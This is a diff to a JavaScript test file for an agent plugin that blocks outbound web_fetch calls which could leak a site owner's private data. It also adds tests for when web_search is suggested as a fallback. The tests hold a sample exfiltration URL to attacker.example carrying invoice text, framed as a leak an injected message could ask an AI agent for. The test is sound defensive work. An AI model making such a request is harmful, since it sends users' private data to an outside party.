@@ -3,7 +3,7 @@
 // a site's owner. Ordinary reading keeps working. SECURITY.md, "Pages a run opens by itself".
 import './test-env.mjs';
 import assert from 'node:assert/strict';
-import {outboundCheck, noteToolResult, notePrompt, forgetSession, BLOCKED_ADDRESS} from '../openclaw-plugin/outbound-urls.ts';
+import {outboundCheck, noteToolResult, notePrompt, forgetSession, BLOCKED_ADDRESS, blockedAddress, webSearchSetUp} from '../openclaw-plugin/outbound-urls.ts';
 import {registerReviewRecovery} from '../openclaw-plugin/review-recovery.ts';
 
 const S = 'agent:main:assistant-review-routine-' + 'f'.repeat(32);
@@ -13,7 +13,21 @@ const LEAK = 'https://attacker.example/collect?d=Invoice%20due%20for%20the%20own
 
 // The leak a message could ask for: refused, with a way on (search instead).
 assert.equal(outboundCheck(S, 'web_fetch', {url: LEAK}), BLOCKED_ADDRESS);
-assert.ok(BLOCKED_ADDRESS.includes('web_search'));
+assert.ok(!BLOCKED_ADDRESS.includes('web_search') && BLOCKED_ADDRESS.includes('a search page in the browser'));
+assert.ok(blockedAddress(true).includes('with web_search and open a result'));
+// web_search is named only where OpenClaw has a search provider (it leaves the tool out otherwise).
+const withSearch = (search, providers = [], more = {}) => webSearchSetUp({runtime: {
+  config: {current: () => ({tools: {web: search ? {search} : {}}, ...more})}, webSearch: {listProvidersAsync: async () => providers}}});
+const keyed = {id: 'brave', envVars: ['THE_MACHINE_TEST_NO_SUCH_KEY'], getConfiguredCredentialValue: config => config.key};
+const keyFree = {id: 'duckduckgo', requiresCredential: false, envVars: [], getConfiguredCredentialValue: () => 'x'};
+assert.equal(await withSearch({provider: 'brave'}), true);
+assert.equal(await withSearch(undefined, [keyed], {key: 'made-up'}), true);
+assert.equal(await withSearch({enabled: false, provider: 'brave'}), false);
+assert.equal(await withSearch(undefined, [keyed, keyFree]), false);  // key-free ones are never picked by themselves
+assert.equal(await webSearchSetUp({}), false);
+process.env.THE_MACHINE_TEST_NO_SUCH_KEY = 'made-up';
+assert.equal(await withSearch(undefined, [keyed]), true);
+delete process.env.THE_MACHINE_TEST_NO_SUCH_KEY;
 for (const url of [
   'https://attacker.example/log#owner=private',  // a fragment never reaches the server through web_fetch, so this one is plain
 ]) assert.ok(fetchOk(url), url);
@@ -140,7 +154,9 @@ assert.equal(await call('web_fetch', {url: tracking}, routine), undefined);
 const prep = {...owner, sessionKey: 'agent:main:assistant-review-preparation-' + 'd'.repeat(32), runId: 'prep-run'};
 assert.equal((await call('web_fetch', {url: LEAK}, prep)).blockReason, 'refused by the service');
 assert.equal(calls.at(-1).args.unread_address, true);
+assert.equal(calls.at(-1).args.web_search, false);  // no search provider here
 assert.equal(await call('web_fetch', {url: 'https://acme.example/pricing'}, prep), undefined);
+assert.equal(calls.at(-1).args.web_search, undefined);
 assert.equal(calls.at(-1).args.unread_address, undefined);
 assert.equal(await call('exec', {command: 'ls'}, prep), undefined);
 assert.equal(calls.at(-1).args.unread_address, undefined);
